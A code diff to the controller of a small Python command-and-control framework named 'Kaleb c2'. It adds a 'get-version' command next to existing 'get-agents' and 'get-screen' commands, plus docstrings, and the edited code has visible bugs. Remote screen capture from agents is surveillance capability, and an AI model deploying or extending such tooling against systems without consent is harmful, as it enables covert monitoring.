@@ -1,3 +1,6 @@
+"""
+controller file
+"""
 import argparse
 import threading
 
@@ -7,30 +10,18 @@ import client
 import message
 from vuls import *
 
-parser = argparse.ArgumentParser(description='Kaleb c2 Controller.')
+args
 
-subparsers = parser.add_subparsers(dest="command")
-
-getscreen_parser = subparsers.add_parser("get-screen")
-getscreen_parser.add_argument('agent_name', help="for share command")
-
-getagents_parser = subparsers.add_parser("get-agents")
-
-parser.add_argument('--server', default='localhost',
-                    help='Kaleb c2 server address')
-
-parser.add_argument('--port', type=int, default=SERVER_PORT,
-                    help='Kaleb c2 server port')
-
-args = parser.parse_args()
-
-done = False
-
-
-# print(args.agent_name)
 
 class Controller(client.Client):
+    """
+    controller class
+    """
+
     def __init__(self):
+        """
+        instructor
+        """
         super().__init__("controller_{}".format
                          (threading.current_thread().name))
 
@@ -46,10 +37,34 @@ class Controller(client.Client):
                 print(self.do_get_agents())
             case "get-screen":
                 self.do_get_screen(agent_name)
+            case "get-version":
+                return self.do_get_version(agent_name)
             case _:
                 print("error")
 
+    def do_get_version(self, agent_name):
+        """
+        sends a get version command
+
+        :param agent_name:
+        :return:
+        """
+        if agent_name is not None:
+            agent_name = agent_name.replace(" ", "")
+            agent_name = agent_name[FIRST_LETTER:LAST_LETTER]
+        else:
+            agent_name = args.agent_name
+        self.send(message.GetVersion(self.my_id, agent_name))
+        response = message.recv(self.my_socket)
+        version = response.version
+        return version
+
     def do_get_screen(self, agent_name):
+        """
+        sends a get screen command
+        :param agent_name:
+        :return:
+        """
         global done
         if agent_name is not None:
             agent_name = agent_name.replace(" ", "")
@@ -119,6 +134,32 @@ class Controller(client.Client):
 
 
 def main():
+    global args
+    """
+    makes a controler object and connects to the server
+    :return:
+    """
+    parser = argparse.ArgumentParser(description='Kaleb c2 Controller.')
+
+    subparsers = parser.add_subparsers(dest="command")
+
+    getscreen_parser = subparsers.add_parser("get-screen")
+    getscreen_parser.add_argument('agent_name', help="for share command")
+
+    getscreen_parser = subparsers.add_parser("get-version")
+
+    getagents_parser = subparsers.add_parser("get-agents")
+
+    parser.add_argument('--server', default='localhost',
+                        help='Kaleb c2 server address')
+
+    parser.add_argument('--port', type=int, default=SERVER_PORT,
+                        help='Kaleb c2 server port')
+
+    args = parser.parse_args()
+
+    done = False
+
     c = Controller()
     c.connect(args.server, args.port)
 
